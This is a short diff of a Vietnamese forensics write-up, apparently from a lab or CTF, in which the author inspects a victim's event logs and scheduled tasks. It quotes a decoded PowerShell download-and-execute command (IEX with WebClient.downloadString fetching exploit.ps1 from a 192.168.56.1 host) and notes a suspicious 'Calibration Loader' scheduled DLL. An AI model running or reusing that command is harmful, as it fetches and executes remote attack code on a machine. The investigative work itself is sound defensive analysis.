@@ -308,7 +308,7 @@ Author : PhoeniX
 ##### Sau khi truy cập vào được máy của nạn nhân, mình tiến hành check evtx log để xem các dữ liệu khả nghi, tại powershell mình thấy 1 đoạn như sau
 ![image](https://hackmd.io/_uploads/BJXfHM5Aye.png)
 ##### Sau khi decode sẽ là `IEX(New-Object Net.WebClient).downloadString('http://192.168.56.1/exploit.ps1')`
-##### Sử dụng công cụ autoruns, thấy rằng có 1 vài scheduled đang chạy 
+##### Tuy nhiên file exploit.ps1 đã bị xóa nên mình sử dụng công cụ autoruns để phân tích động và kiểm tra backdoor, thấy rằng có 1 vài schedule đang chạy 
 ![image](https://hackmd.io/_uploads/S14pCc90kl.png)
 ##### 1 schedule có tên `Calibration Loader` chạy từ 1 file dll khá đáng ngờ
 ![image](https://hackmd.io/_uploads/BJOSJocR1l.png)
